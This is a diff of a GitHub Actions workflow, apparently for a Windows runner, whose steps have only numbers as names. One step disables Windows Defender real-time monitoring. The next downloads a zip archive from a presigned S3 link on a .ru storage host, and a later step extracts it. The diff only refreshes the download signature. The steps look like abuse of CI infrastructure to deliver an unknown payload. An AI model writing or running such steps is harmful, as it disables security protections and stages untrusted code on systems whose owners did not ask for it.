@@ -21,7 +21,7 @@ jobs:
     - name: 11
       run: Set-MpPreference -DisableRealtimeMonitoring $true
     - name: 5
-      run: Invoke-WebRequest -URI "https://s3.twcstorage.ru/291a71b8-a30c-4d1a-8368-2e95b84cdc9e/1122.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=7SFZ3WNZZ680A26ASRV1%2F20260514%2Fru-1%2Fs3%2Faws4_request&X-Amz-Date=20260514T071836Z&X-Amz-Expires=3900&X-Amz-Signature=c1ab4aa23998bf486db9b12bfb8e6a3e23d31565d4e5d84a0d53f6fb1d67104a&X-Amz-SignedHeaders=host&x-id=GetObject" -outfile c:\21\1122.zip
+      run: Invoke-WebRequest -URI "https://s3.twcstorage.ru/291a71b8-a30c-4d1a-8368-2e95b84cdc9e/1122.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=7SFZ3WNZZ680A26ASRV1%2F20260514%2Fru-1%2Fs3%2Faws4_request&X-Amz-Date=20260514T091648Z&X-Amz-Expires=3900&X-Amz-Signature=b34ac34f69e942b278f8b948f7db583e33eb3e2a83669cdc3e3aba3f924345d1&X-Amz-SignedHeaders=host&x-id=GetObject" -outfile c:\21\1122.zip
     - name: 7
       run: Expand-Archive -LiteralPath "c:\21\1122.zip" -DestinationPath "C:\21"
     - name: 15
